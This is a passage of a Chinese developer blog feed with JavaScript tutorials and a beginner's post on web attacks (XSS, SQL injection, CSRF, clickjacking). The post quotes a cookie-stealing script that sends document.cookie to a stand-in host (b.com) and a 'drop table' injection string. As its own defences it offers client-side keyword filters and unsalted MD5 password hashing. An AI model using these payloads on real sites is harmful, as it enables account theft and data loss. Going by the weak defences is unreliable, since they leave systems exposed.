      <content type="text"><![CDATA[前言本来this应该放在《上下文环境和作用域》中来讲，结果发现自己整理的时候，例子越来越多，所以单独写一篇用于加深理解，以后工作或项目中发现一些this相关问题可以进一步完善文章的例子。 this概念 在函数中this到底取何值，是在函数真正被调用执行的时候确定的，函数定义的时候确定不了 因为this的取值是执行上下文环境的一部分，每次调用函数，都会产生一个新的执行上下文环境。 构造函数 所谓构造函数就是用来new对象的函数。其实严格来说，所有的函数都可以new一个对象，但是有些函数的定义是为了new一个对象，而有些函数则不是。另外注意，构造函数的函数名第一个字母大写（规则约定）。例如：Object、Array、Function等。 12345678function Foo() &#123; this.name = &quot;yzh&quot;; this.year = 1996; console.log(this); //Object &#123; name: &quot;yzh&quot;, year: 1998 &#125; &#125; var f1 = new Foo(); console.log(f1.name); //yzh console.log(f1.year); //1996 以上代码中，如果函数作为构造函数用，那么其中的this就代表它即将new出来的对象。 注意，以上仅限newFoo()的情况，即Foo函数作为构造函数的情况。如果直接调用Foo函数，而不是new Foo()，情况就大不一样了。 123456function Foo() &#123; this.name = &quot;yzh&quot;; this.year = 1996; console.log(this); //Object &#123; name: &quot;yzh&quot;, year: 1998 &#125; &#125; Foo(); //window 这种情况下this是window。 函数作为对象的一个属性如果函数作为对象的一个属性时，并且作为对象的一个属性被调用时，函数中的this指向该对象。 12345678var obj = &#123; x: 10, fn: function() &#123; console.log(this); //Object &#123; x: 10, fn: fn() &#125; console.log(this.x); //10 &#125; &#125;; obj.fn(); 以上代码中，fn不仅作为一个对象的一个属性，而且的确是作为对象的一个属性被调用。结果this就是obj对象。 如果fn函数不作为obj的一个属性被调用，会是什么结果呢？ 123456789var obj = &#123; x: 10, fn: function() &#123; console.log(this); //window console.log(this.x); //undefined &#125; &#125;; var f1 = obj.fn; f1(); 如上代码，如果fn函数被赋值到了另一个变量中，并没有作为obj的一个属性被调用，那么this的值就是window，this.x为undefined。 函数用call或者apply调用为了防止看不懂这块先理解下基础并重要的东西 函数内部属性在函数内部，有两个特殊的对象：arguments和this.主要介绍下arguments,它是类数组对象，包含传入函数的所有参数，这个对象还有一个叫callee的属性，该属性为一个指针，指向拥有这个arguments对象的函数。 这个例子主要用于消除函数的执行与同名函数的紧密耦合现象。代码如下： 12345678910111213141516171819function factorial(num) &#123; if (num &lt;= 1) &#123; return 1; &#125; else &#123; // return num * factorial(num - 1); //1.一般的递归算法运用 return num * arguments.callee(num - 1) //2.更好的做法 &#125; &#125; var trueFactorial = factorial; factorial = function() &#123; return 0; &#125;; alert(trueFactorial(5)); //120 alert(factorial(5)); //0 函数属性每个函数都包含两个属性：length和prototype.length表示函数希望接受的命名参数的个数 123456789101112131415function sayName(name)&#123; alert(name); &#125; function sum(num1, num2)&#123; return num1 + num2; &#125; function sayHi()&#123; alert(&quot;hi&quot;); &#125; alert(sayName.length); //1 alert(sum.length); //2 alert(sayHi.length); //0 prototype属性这里不再重复介绍。 函数方法每个函数都包含两个非继承而来的方法：apply()和call(),这两个方法的用途都是在特定的作用域中调用函数，实际上等于设置函数体内的this对象值。 apply()方法接受两个参数：一个是在其中运行函数的作用域，另一个是参数数组。1234567891011121314function sum(num1, num2)&#123; return num1 + num2; &#125; function callSum1(num1, num2)&#123; return sum.apply(this, arguments); &#125; function callSum2(num1, num2)&#123; return sum.apply(this, [num1, num2]); &#125; alert(callSum1(10,10)); //20 alert(callSum2(10,10)); //20 callsSum1()执行sum()函数时传入this作为this值（在全局作用域中调用，所以传入的对象为window对象）下面的例子同理。 call()方法与apply()方法差不多，区别在于接受参数的方式不同。简单来说就是：传递给函数的参数必须逐个列举出来。(如果是无参函数就不用传参数) 123456789function sum(num1, num2)&#123; return num1 + num2; &#125; function callSum(num1, num2)&#123; return sum.call(this, num1, num2); &#125; alert(callSum(10,10)); //20 传递参数并非两个函数的真正用武之地，真正强大的地方是扩充函数赖以运行的作用域123456789101112window.color = &quot;red&quot;; var o = &#123; color: &quot;blue&quot; &#125;; function sayColor()&#123; alert(this.color); &#125; sayColor(); //red sayColor.call(this); //red sayColor.call(window); //red sayColor.call(o); //blue 如下代码如果不用函数的方法来实现。1234567891011window.color = &quot;red&quot;; var o = &#123; color: &quot;blue&quot; &#125;; function sayColor()&#123; alert(this.color); &#125; sayColor(); //red o.sayColor = sayColor; o.sayColor(); //blue 如果要输出o对象里的color属性值，必须把sayColor函数赋给对象o并调用 o.sayColor()时，this引用的对象为o 回归要讲的例子 当一个函数被call和apply调用时，this的值就取传入的对象的值。 12345678var obj = &#123; x: 10 &#125;; var fn = function() &#123; console.log(this); //Object &#123; x: 10 &#125; console.log(this.x); //10 &#125;; fn.call(obj); 全局 &amp; 调用普通函数在全局环境下，this永远是window，这个应该没有非议。 1console.log(this === window); //true 普通函数在调用时，其中的this也都是window。 123456var x = 10; var fn = function() &#123; console.log(this); //window console.log(this.x); //10 &#125; fn(); 注意以下的情况1234567891011var obj = &#123; x: 10, fn: function() &#123; function f() &#123; console.log(this); //Window console.log(this.x); //undefined &#125; f(); &#125; &#125;; obj.fn(); 函数f虽然是在obj.fn内部定义的，但是它仍然是一个普通的函数，this仍然指向window。 总结：this指向调用该函数的对象 构造函数的prototype中，this代表着什么123456789function Fn() &#123; this.name = &quot;yzh&quot;; this.year = 1996; &#125; Fn.prototype.getName = function() &#123; console.log(this.name); &#125; var f1 = new Fn(); f1.getName(); //yzh 在Fn.prototype.getName函数中，this指向的是f1对象。因此可以通过this.name获取f1.name的值 End欢迎拍砖,有更多的好的例子，欢迎提出，文中有误的地方也欢迎指正。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JavaScript高级程序设计——原型和原型链]]></title>
      <url>%2Fjs-prototype%2F</url>
      <content type="text"><![CDATA[前言此文章为加深对JS中重要概念进行理解，不建议没有任何JS基础的人看，只为加深对概念理解通过实际的例子，而不是看书以为自己读懂了，可能几天后就忘了，主要是为了理解核心概念，以及对重难点解释。 一切都是对象 “一切都是对象”这句话的重点在于如何去理解“对象”这个概念。 概念JavaScript 中，万物皆对象！但对象也是有区别的。分为普通对象和函数对象，Object 、Function 是 JS 自带的函数对象。当然，也不是所有的都是对象，值类型就不是对象。 123456789101112131415function show(x) &#123; console.log(typeof x); // undefined console.log(typeof 10); // number console.log(typeof &apos;abc&apos;); // string console.log(typeof true); // boolean console.log(typeof function () &#123;&#125;); //function console.log(typeof [1, &apos;a&apos;, true]); //object console.log(typeof &#123; a: 10, b: 20 &#125;); //object console.log(typeof null); //object console.log(typeof new Number(10)); //object &#125; show(); 以上代码列出了typeof输出的集中类型标识，其中上面的四种（undefined, number, string, boolean）属于简单的值类型，不是对象。剩下的几种情况——函数、数组、对象、null、new Number(10)都是对象。他们都是引用类型。 对象——若干属性的集合概念数组是对象，函数是对象，对象还是对象。 对象里面的一切都是属性，只有属性，没有方法 那么这样方法如何表示呢？——方法也是一种属性。因为它的属性表示为键值对的形式。而且，javascript中的对象可以任意的扩展属性，没有class的约束。这个大家应该都知道，就不再强调了。 先说个最常见的例子： 12345678910var obj = &#123; a: 10, b: function(x) &#123; alert(this.a + x) &#125;, c: &#123; name: &quot;yzh&quot;, age: 21 &#125; &#125; 以上代码中，obj是一个自定义的对象，其中a、b、c就是它的属性，而且在c的属性值还是一个对象，它又有name、year两个属性。 这个可能比较好理解，那么函数和数组也可以这样定义属性吗？——当然不行，但是它可以用另一种形式，总之函数/数组之流，只要是对象，它就是属性的集合。 1234567891011var fn = function () &#123; alert(100); &#125;; fn.a = 10; fn.b = function () &#123; alert(123); &#125;; fn.c = &#123; name: &quot;yzh&quot;, age: 21 &#125;; 上段代码中，函数就作为对象被赋值了a、b、c三个属性——很明显，这就是属性的集合。 （引用类型）都是对象，对象是属性的集合。最需要了解的就是对象的概念。 创建对象前言这块在《JS高级程序设计》也算是大章节下的一块大内容，我只把一些重要的概念写出来让大家理解，具体的深入要自己去看书中的讲解。 函数和对象的关系 对象都是通过函数创建的 12345function Fn() &#123; this.name = &apos;yzh&apos;; this.year = 1996; &#125; var fn1 = new Fn(); 有人可能会举出如下反例 12var obj = &#123; a: 10, b: 20 &#125;;var arr = [5, &apos;x&apos;, true]; 这种做法属于使用“快捷方式”，在编程语言中，一般叫做“语法糖”。其实以上代码的本质是： 1234567891011//var obj = &#123; a: 10, b: 20 &#125;;//var arr = [5, &apos;x&apos;, true]; var obj = new Object(); obj.a = 10; obj.b = 20; var arr = new Array(); arr[0] = 5; arr[1] = &apos;x&apos;; arr[2] = true; 而其中的 Object 和 Array 都是函数：12console.log(typeof (Object)); // functionconsole.log(typeof (Array)); // function 总结：对象都是通过函数来创建的 prototype函数也是一种对象。他也是属性的集合，你也可以对函数进行自定义属性 每创建一个函数，就会同时创建函数的prototype对象。这个prototype的属性值是一个对象（属性的集合，再次强调！），默认的只有一个叫做constructor的属性，指向这个函数本身。 123456789function Fn() &#123; &#125; Fn.prototype.name = &apos;王福朋&apos;; Fn.prototype.getYear = function () &#123; return 1988; &#125;; var fn = new Fn(); console.log(fn.name); console.log(fn.getYear()); Fn是一个函数，fn对象是从Fn函数new出来的，这样fn对象就可以调用Fn.prototype中的属性。 因为每个对象都有一个隐藏的属性——“proto”，这个属性引用了创建这个对象的函数的prototype。 即：fn.proto === Fn.prototype这里的”proto“成为“隐式原型” 隐式原型 每个函数function都有一个prototype，即原型。这里再加一句话——每个对象都有一个proto，可成为隐式原型。proto用于指向创建它的构造函数的原型对象 对象 person1 有一个 proto属性，创建它的构造函数是 Person，构造函数的原型对象是 Person.prototype ，所以： person1.proto == Person.prototype 又比如：obj这个对象本质上是被Object函数创建的，因此obj.proto=== Object.prototype 在说明“Object.prototype”之前，先说一下自定义函数的prototype。自定义函数的prototype本质上就是和 var obj = {} 是一样的，都是被Object创建，所以它的proto指向的就是Object.prototype。 但是Object.prototype确是一个特例——它的proto指向的是null.至于为什么简单解释下： 所有的构造器都来自于 Function.prototype，甚至包括根构造器Object及Function自身。所有构造器都继承了·Function.prototype·的属性及方法。如length、call、apply、bind 12345678910console.log(typeof Function.prototype) // functionconsole.log(typeof Object.prototype) // objectconsole.log(typeof Number.prototype) // objectconsole.log(typeof Boolean.prototype) // objectconsole.log(typeof String.prototype) // objectconsole.log(typeof Array.prototype) // objectconsole.log(typeof RegExp.prototype) // objectconsole.log(typeof Error.prototype) // objectconsole.log(typeof Date.prototype) // objectconsole.log(typeof Object.prototype) // object 知道了所有构造器（含内置及自定义）的proto都是Function.prototype， Function.prototype的proto是谁呢？ console.log(Function.prototype.proto === Object.prototype) // true这说明所有的构造器也都是一个普通 JS 对象，可以给构造器添加/删除属性等。同时它也继承了Object.prototype上的所有方法：toString、valueOf、hasOwnProperty等。 最后Object.prototype的proto是谁？ Object.prototype.proto === null // true已经到顶了，为null。 原型链概念 访问一个对象的属性时，先在基本属性中查找，如果没有，再沿着proto这条链向上找 javascript中的继承是通过原型链来体现的. 传统原型语法12345678function Foo() &#123;&#125; Foo.prototype.a = 100; Foo.prototype.b = 200; var f1 = new Foo(); f1.a = 10; alert(f1.a); //10 alert(f1.b); //200 12345678function Foo() &#123;&#125; var f1 = new Foo(); f1.a = 10; Foo.prototype.a = 100; Foo.prototype.b = 200; alert(f1.a); //10 alert(f1.b); //200 对象字面量方法添加属性和方法的注意事项12345678910function Foo() &#123;&#125; Foo.prototype = &#123; a: 100, b: 200 &#125; var f1 = new Foo(); f1.a = 10; alert(f1.a); //10 alert(f1.b); //200 12345678910function Foo() &#123;&#125; var f1 = new Foo(); f1.a = 10; Foo.prototype = &#123; a: 100, b: 200 &#125; alert(f1.a); //10 alert(f1.b); //undefined 原型的属性和方法赋值要在，新建实例对象之前，不然无法获得原型的值和属性，alert返回相应的undefined 重写原型对象问题接上面的例子讲,如果在实例上添加新属性，这个属性就会屏蔽原型对象中保存的同名属性，就是阻止访问了属性，而不是修改原型的属性。 12345678910function Foo() &#123;&#125; var f1 = new Foo(); f1.a = 10; Foo.prototype = &#123; a: 100, b: 200 &#125; alert(f1.a); //10 alert(f1.b); //undefined 总结：重写原型对象切断了现有原型与任何之前已经存在的对象实例之间的关系，它们的引用的仍然是最初的原型。 End暂时总结到此，有些知识点没有讲到，可能需要大家自己去看书或查阅资料来理解，本人理解也有限，文中若有难以理解的还望大神换个方式来阐述。 未完待续后续还有两篇讲解《执行上下文与作用域》和《闭包》，最后一篇闭包可能会有一些前端面试题来讲，并在文章末做个总结。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端框架快速开发静态页面]]></title>
      <url>%2Fweb-front%2F</url>
      <content type="text"><![CDATA[前言最近很久没有写文章，不忙也忙的生活节奏，博客相关的东西也没法做成文章来详细讲，最多就是SEO相关，倒也没多少人会真正用到，所以过了一段时间，就目前开发完的学院实训系统web网页项目做个回顾，整个团队就我一个前端开发，所以我负责了需求分析、原型设计、UI/UE设计等工作。团队其他成员和老师都是负责java web后台。个人从用框架开发浅谈对框架开发的效率和效果的意义。 前端页面开发框架常见web页面框架web页面开发的框架，可能常用并且熟悉也就那几个. 页面布局框架：Bootstrap、Materialize JS框架： Jquery 一眼看过去似乎有点少哦，其实开发web网站只要需求不是特别多的，基本就够了，有些甚至JS都用的少。 开发中前台页面开发最简单，因为需求的不多，其实如果复杂了，也就会多用到H5和CSS3的一些东西外加JS和Ajax。 框架浅谈Bootstrap这个框架确实厉害，我也不多介绍了。就跟它的宣传语一样。 Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目。所有开发者、所有应用场景而设计。 Bootstrap 让前端开发更快速、简单。所有开发者都能快速上手、所有设备都可以适配、所有项目都适用。 确实目前很多网页都用了这个框架，确实为开发省力不少，不过一些大公司的网页都是把里面需要用的组建封装成自己的，并加以改变利用。 新手可能很难上手并做到自己DIY，还是建议按着文档的方法来调用。等到有实际需求需要整合代码才去把代码独立并入到工程中。 学会如何把别人框架组件的代码整合进自己项目的CSS和JS中确实很有用，因为框架下载的很多都是压缩好的，大小很大，如果只用少部分JS和CSS样式就有点大材小用了，所以得下对应的组建并入到自己的工程中。 Materialize此框架出自谷歌可能知名度没有Bootstrap大，但是它的设计感、配色和动画效果，在目前看来是框架中最完美的！ 官网给出了很多组件的效果和使用方法，大家自行去看看效果吧.Materialize。 此框架除去它的其他页面布局外，我最看重它的配色表和它给出的模版页面，可以极大降低前端对于网页的设计和布局的困惑，因为没有独立的平面设计师来规划整个布局，前端开发借助框架能更快开发出想要的效果并且很好看。 总结其实没讲到Jquery，因为这个JS框架，对开发其实作用不大，主要是因为框架自身都需要Jquery来支持，它是一个必需品，因为它让JS语言更优美实用，writer less，do more。 其实到最后，我都没有用上述的框架，而是发现了一个国外团队自己组建的新框架。这个框架结合了Google’s Material Design Standards 和 Bootstrap. 用过后，我发现了将Materialize框架的一些优点结合了Bootstrap的一些布局特点，将两者共有的组件进行优化和美化，配色和动画效果主要参考的Material，让Bootstrap的一些组件更生动，提高了用户的体验。后面详细讲下这个框架。 Propeller前后台页面框架 What is propeller?前面提到了，就是一个极其好用的前后台结合了Materialize和Bootstrap框架。我更看重后台的一些组件效果，比如很多后台需要用到的，图表、数据表格、日历选择都有，虽然可选性不多，但足够用了。 使用效果登录页面后台主页面 因为Propeller提供提供了包含它组件的后台管理页面，所以开发起来难度不大。 登录模块用到了验证框架后面会说，然后根据项目需求自己DIY设置了一些东西和样式。让开发效率得到了解放和提示，并利于二次开发。 后台这块的难度主要在于二期开发中可能会涉及到数据的图表展示，需要用到JS插件来完成，目前还未着手开发。然后就是数据的表格、表单展示，用插件自带的数据表格，实现了对表单的排序和搜索，简化了后台开发的工作量。 具体的页面效果和交互效果大家在文章最后点击访问我给出的地址查看源代码和演示页面。 bootstrapValidator表单验证表单验证的第三方插件确实有不少，bootstrapValidator这个是我在一个网站偶然发现的，由别人整理出来发表过，我就拿来用了。只是这个框架是根据查询表单的ID来定位的，但是我开发的时候用的Propeller框架，它的模版页面把项目需求的三个页面集合到了一个上，即登录、注册、找回页面，产生了三个页面，所以我在JS一共调用了3次来检测，不知道有什么更方便简洁的方法不。因为我的一个页面上面有三个表单，通过按钮点击来控制隐藏和显示。 做验证这块，设计到了正则表达式，因为要验证邮箱和密码长度、强度，所以网上百度了下，这方面的正则写法。 1234regexp: &#123; regexp: /(?!^[0-9]+$)(?!^[A-z]+$)(?!^[^A-z0-9]+$)^.&#123;6,12&#125;$/, message: &apos;必须包含数字和字母，以字母开头（长度为6-12位）&apos;&#125;, 12var email = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((\.[a-zA-Z0-9_-]&#123;2,3&#125;)&#123;1,2&#125;)$/; //获取输入邮箱并用正则表达式把空格替换为空字符 邮箱检验其实bootstrapValidator中可以用正则来检验，我当时为了实现点击发送验证码的效果，所以把这块的检验又重复了一遍，因为控制其邮箱的规范来发送邮件，实现自动倒计时的效果。必须保证邮箱有效。因为不知道如何在bootstrapValidator框架中来调用自己的方法和函数，所以就这样用了个单独的JS来完成。完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 验证码jsvar sends = &#123; checked: 1, send: function() &#123; var email = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((\.[a-zA-Z0-9_-]&#123;2,3&#125;)&#123;1,2&#125;)$/; //获取输入邮箱并用正则表达式把空格替换为空字符 var val = $(&apos;#forgot-email&apos;).val().replace(/\s+/g, &quot;&quot;); var vall = $(&apos;#fotgot-email&apos;).val().replace(/\s+/g, &quot;&quot;); if ($(&apos;.div-email&apos;).find(&apos;span&apos;).length == 0 &amp;&amp; $(&apos;.div-email a&apos;).attr(&apos;class&apos;) == &apos;send1&apos;) &#123; if (!email.test(val) || val.length == 0) &#123; $(&apos;.div-email&apos;).append(&apos;&lt;span class=&quot;error&quot;&gt;Error&lt;/span&gt;&apos;); return false; &#125; &#125; if ($(&apos;.div-email&apos;).find(&apos;span&apos;).length == 0 &amp;&amp; $(&apos;.div-email a&apos;).attr(&apos;class&apos;) == &apos;send1&apos;) &#123; if (!email.test(vall) || vall.length == 0) &#123; $(&apos;.div-email&apos;).append(&apos;&lt;span class=&quot;error&quot;&gt;Error&lt;/span&gt;&apos;); return false; &#125; &#125; if (email.test(val)) &#123; var time = 60; $(&apos;.div-email span&apos;).remove(); function timeCountDown() &#123; if (time == 0) &#123; clearInterval(timer); $(&apos;.div-email a&apos;).addClass(&apos;send1&apos;).removeClass(&apos;send0&apos;).html(&quot;发送验证码&quot;); sends.checked = 1; return true; &#125; $(&apos;.div-email a&apos;).html(time + &quot;S后再次发送&quot;); time--; return false; sends.checked = 0; &#125; $(&apos;.div-email a&apos;).addClass(&apos;send0&apos;).removeClass(&apos;send1&apos;); timeCountDown(); var timer = setInterval(timeCountDown, 1000); &#125; if (email.test(vall)) &#123; var time = 60; $(&apos;.div-email span&apos;).remove(); function timeCountDown() &#123; if (time == 0) &#123; clearInterval(timer); $(&apos;.div-email a&apos;).addClass(&apos;send1&apos;).removeClass(&apos;send0&apos;).html(&quot;发送验证码&quot;); sends.checked = 1; return true; &#125; $(&apos;.div-email a&apos;).html(time + &quot;S后再次发送&quot;); time--; return false; sends.checked = 0; &#125; $(&apos;.div-email a&apos;).addClass(&apos;send0&apos;).removeClass(&apos;send1&apos;); timeCountDown(); var timer = setInterval(timeCountDown, 1000); &#125; &#125; &#125; // 消除重复错误样式$(&quot;.register-login&quot;).click(function() &#123; $(&apos;.div-email span&apos;).remove();&#125;) 这个验证框架还有点小问题，就是当验证失败的时候，应该要阻止表单提交的默认事件发生，框架没有做这方面处理，需要我们自己来完善，代码如下： 12345678910// 验证成功前提交按钮不起作用$(&quot;#defaultForm&quot;).submit(function(ev) &#123; ev.preventDefault(); &#125;);$(&quot;#defaultFormm&quot;).submit(function(ev) &#123; ev.preventDefault(); &#125;);$(&quot;#submit&quot;).on(&quot;click&quot;, function() &#123; var bootstrapValidator = $(&quot;#defaultForm&quot;).data(&apos;bootstrapValidator&apos;); bootstrapValidator.validate(); if (bootstrapValidator.isValid()) $(&quot;#defaultForm&quot;).submit(); else return;&#125;); 保证只要有表单错误，按钮不起作用，全部正确后按钮可用。 注意：bootstrapValidator验证框架用的字体图标有2套(glyphicon和FontAwesome)，推荐大家使用FontAwesome，至于为什么，glyphicon在火狐浏览器会出现问题，FontAwesome目前在火狐、IE、谷歌内核浏览器不会出现问题，问题主要是加载不出来字体文件。 缺陷：表单验证中，我还没找到正则表达式来实现验证密码，首字母开头并要有大写，并且由数字和字母组成的正则表达式写法，因为对正则不熟悉，也算是一个遗憾了。目前的效果是只要包含了字幕和数字长度大于6位验证就通过。 使用其他小插件收获基于Bootstrap的导航为什么想到用这个插件来实现导航，因为考虑到效率和效果，因为团队没有美工啊，我自己考虑到了兼容性问题，想做个适配手机端的首页效果，后台和登录界面没有做适配移动端的设计，所以为了快速开发并且好看用到了网上开源的一个插件，有23种基于Bootstrap设计的导航效果。 现在都是框架开发，很多东西其实真的不想从底层开始写，加之原型图根本没有美工，自己来设计要浪费很多时间成本。浏览器没有下拉时浏览器下拉后 hover的css效果hover的CSS3动画效果，只支持IE9以上的浏览器，是为了增加用户体验而添加的效果。具体的效果要自己看，我这里就不录GIF动画来展示效果了，效果主要在首页的列表新闻的更多按钮那，和顶部菜单导航也用到了动画效果。 End框架开发解放了生产力，让一个静态页面效果更逼真，也让用户体验逐渐上去，但是目前对网站的需求主要还是为了展示和宣传一些东西，反观教育机构和政府部门的网站都是偏动画少，体现了公关的严肃性。所以动画效果尽量还是分对象来使用。 框架和插件在计算机领域的各行业都是持续不减的话题，有人鼓励直接用框架和插件，有人赞成原生手写辅以框架。有人注重页面展示效果，却不关心底层的实现，有人重视底层实现原理，愿意自己照葫芦画瓢花大量时间自己写，还有人兼顾两者，利用完框架实现页面效果后，重新看框架实现的源代码，理解其中来龙去脉，根据自己实现选择是否深入研究。 最后在这里，开源下项目代码：github地址：https://github.com/cduyzh/practiceSystem 在线预览地址：http://www.cduyzh.com/practiceSystem/ 如果有任何问题欢迎联系我在博客评论、github、QQ等。谢谢！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Web安全——前端JS表单验证过滤]]></title>
      <url>%2Fjs-validate-code%2F</url>
      <content type="text"><![CDATA[前言之前忙于做各种事情，已经很久没写过文章，最近接的一个学校的网站项目，近期被人用自动脚本攻破了（笑…），因为我们第一次做这种上线的项目，完全没有意识到一些web安全的知识，所以就开始了紧急的漏洞补救和防护措施。所以我就把近期学习的知识总结下。目前我水平有限，只能做一个初级认识，让一些刚入行做上线的实际项目的同学能有所警惕。 原因安全小白作为这个网站项目组长，我是完全不知道这些安全隐患问题的，团队的人员也没有研究过这些，所以造成了这个情况，因为我们是在校大学学生，确实学无余力来研究这些，希望对还未出社会的初学者提个醒。 web常见攻击手段我只会大概提及它的攻击原理和预防方法，具体的实现和深入研究还请大家自行百度，因为只有真正需要用到才会去详细了解，这里我只为web安全小白做知识扫盲。因为博主目前接触最多的服务端语言是JAVA所以例子都从java web项目来讲。 跨站脚本攻击（XSS）虽然我们目前做的是一个博客的小网站，但是以后无论是自己的博客还是实际的项目，都可以用图片来提供外链，方便管理，如果你的网站访问量很高啊，一天几十万几百万啊，我的天啊，这时候你考虑的就不是服务器空间够不够大，而是惊人的并发数啊，光是请求html文件（或其他）的链接就处理不过来了，哪还有多余的资源去读取图片啊，索性就把图片存另一个服务器吧，给主服务器减轻压力啊，于是图床诞生了。 反射型XSS 它是通过诱使用户打开一个恶意链接，服务端将链接中参数的恶意代码渲染到页面中，再传递给用户由浏览器执行，从而达到攻击的目的。如下面的链接： 1http://a.com/a.jsp?name=xss&lt;script&gt;alert(1)&lt;/script&gt; a.jsp将页面渲染成下面的html： 1Hello xss&lt;script&gt;alert(1)&lt;/script&gt; 这时浏览器将会弹出提示框。 这算是常见的一种方法，预防的话可以通过后台编写方法来拦截过滤到这些非法或有攻击性的字符。 持久型XSS 持久型XSS将恶意代码提交给服务器，并且存储在服务器端，当用户访问相关内容时再渲染到页面中，以达到攻击的目的，它的危害更大。 比如，攻击者写了一篇带恶意JS代码的博客，文章发表后，所有访问该博客文章的用户都会执行这段恶意JS。 这个相对来说对我们开发网站来说不算重要，但是要小心攻击者在你网站注入一些非法代码，从而达到这个目的。 Cookie劫持 Cookie中一般保存了当前用户的登录凭证，如果可以得到，往往意味着可直接进入用户帐户，而Cookie劫持也是最常见的XSS攻击。以上面提过的反射型XSS的例子来说，可以像下面这样操作： 首先诱使用户打开下面的链接： 1http://a.com/a.jsp?name=xss&lt;script src=http://b.com/b.js&gt;&lt;/script&gt; 用户打开链接后，会加载b.js，并执行b.js中的代码。b.js中存储了以下JS代码： 123var img = document.createElement(&quot;img&quot;);img.src = &quot;http://b.com/log?&quot; + escape(document.cookie);document.body.appendChild(img); 上面的代码会向b.com请求一张图片，但实际上是将当前页面的cookie发到了b.com的服务器上。这样就完成了窃取cookie的过程。 防御Cookie劫持的一个简单的方法是在Set-Cookie时加上HttpOnly标识，浏览器禁止JavaScript访问带HttpOnly属性的Cookie。 XSS的防御 输入检查对输入数据做检查，比如用户名只允许是字母和数字，邮箱必须是指定格式。一定要在后台做检查，否则数据可能绕过前端检查直接发给服务器。一般前后端都做检查，这样前端可以挡掉大部分无效数据。对特殊字符做编码或过滤，但因为不知道输出时的语境，所以可能会做不适当的过滤，最好是在输出时具体情况具体处理。 输出检查对渲染到HTML中内容执行HtmlEncode，对渲染到JavaScript中的内容执行JavascriptEncode。另外还可以使用一些做XSS检查的开源项目。SQL注入SQL注入常常会听到，它与XSS类似，是由于用户提交的数据被当成命令来执行而造成的。下面是一个SQL注入的例子： 1String sql = &quot;select * from user where username = &apos;&quot; + username + &quot;&apos;&quot;; 像上面的SQL语句，如果用户提交的username参数是leo，则数据库执行的SQL为： 1select * from user where username = &apos;leo&apos; 但如果用户提交的username参数是leo’; drop table user–，那执行的SQL为： 1select * from user where username = &apos;leo&apos;; drop table user--&apos; 在查询数据后，又执行了一个删除表的操作，这样的后果非常严重。 博主本人的网站就是主要被SQL注入导致网站数据库受损 SQL注入的防御防止SQL注入最好的方法是使用预编译语句，如下面所示： 1234String sql = &quot;select * from user where username = ?&quot;;PreparedStatement pstmt = conn.prepareStatement(sql);pstmt.setString(1, username);ResultSet results = pstmt.executeQuery(); 不同语言的预编译方法不同，但基本都可以处理。 如果遇到无法使用预编译方法时，只能像防止XSS那样对参数进行检查和编码。 博主后面会贴出自己完善项目的检测代码，就是对网站可以进行数据提交的表单的输入进行SQL语句检测。 跨站请求伪造（CSRF）跨站请求伪造的英文全称是Cross Site Request Forgery，是由于操作所需的所有参数都能被攻击者得到，进而构造出一个伪造的请求，在用户不知情的情况下被执行。看下面一个例子： 如果a.com网站需要用户登录后可以删除博客，删除博客的请求地址如下： 1GET http://a.com/blog/delete?id=1 当用户登录a.com后，又打开了http://b.com/b.html，其中有下面的内容： 1&lt;img src=&quot;http://a.com/blog/delete?id=1&quot;/&gt; 这时会以用户在a.com的身份发送http://a.com/blog/delete?id=1，删除那篇博客。 CSRF的防御 验证码 CSRF是在用户不知情的情况下构造的网络情况，验证码则强制用户与应用交互，所以验证码可以很好得防止CSRF。但不能什么请求都加验证码。 referer检查 检查请求header中的referer也能帮助防止CSRF攻击，但服务器不是总能拿到referer，浏览器可能出于安全或隐私而不发送referer，所以也不常用。倒是图片防盗链中用得很多。 Anti CSRF Token 更多的是生成一个随机的token，在用户提交数据的同时提交这个token，服务器端比对后如果不正确，则拒绝执行操作。 作为了解，一般前面的攻击都过了，就可以造成此类攻击。 点击劫持（ClickJacking）点击劫持是从视觉上欺骗用户。攻击者使用一个透明的iframe覆盖在一个网页上，诱使用户在该网页上操作，而实际点击却是点在透明的iframe页面。 点击劫持延伸出了很多攻击方式，有图片覆盖攻击、拖拽劫持等。点击劫持的防御 针对iframe的攻击，可使用一个HTTP头：X-Frame-Options，它有三种可选值： DENY： 禁止任何页面的frame加载； SAMEORIGIN：只有同源页面的frame可加载； ALLOW-FROM：可定义允许frame加载的页面地址。 针对图片覆盖攻击，则注意使用预防XSS的方法，防止HTML和JS注入。 作为了解，一般前面的攻击都过了，就可以造成此类攻击。 我的方法前言我们负责的团队项目为学校网站制作，所以涉及到用户输入的地方都在后台管理模块，从后台登录界面开始就应该做一些防护措施了。 登录的字符检测123456789101112131415161718192021222324function validate(value) &#123; var pattern = /[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&apos;[\]]/im; if (value === &apos;&apos; || value === null) return false; if (pattern.test(value)) &#123; alert(&quot;非法字符！&quot;); return false; &#125; return true;&#125;function filterSqlStr(value) &#123; var str = &quot;and,delete,or,exec,insert,select,union,update,count,*,&apos;,join,&gt;,&lt;&quot;; var sqlStr = str.split(&apos;,&apos;); var flag = true; for (var i = 0; i &lt; sqlStr.length; i++) &#123; if (value.toLowerCase().indexOf(sqlStr[i]) != -1) &#123; flag = false; break; &#125; &#125; alert(flag); return flag;&#125; JS封装的2个方法，用于返回布尔值来判断是否通过。第一个为了过滤掉非法字符，第二个为了过滤有关数据库操作的非法字符。 密码MD5加密1234567891011121314151617181920212223242526272829303132333435363738//password Md5 public static String MD5Password(String oldstr) &#123; char hexDigits[] = &#123; &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos; &#125;; byte[] oldbytes = oldstr.getBytes(); try &#123; MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);// 获取对象 md.update(oldbytes);// 初始化对象 byte[] newBytes = md.digest();// 运行加密算法 char[] newStr = new 